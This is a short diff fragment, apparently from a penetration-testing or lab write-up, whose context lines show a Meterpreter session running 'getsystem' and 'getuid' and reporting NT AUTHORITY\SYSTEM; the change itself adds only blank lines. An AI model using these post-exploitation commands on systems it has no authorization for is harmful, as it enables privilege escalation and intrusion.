@@ -18,3 +18,5 @@ meterpreter > getsystem
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
+
+
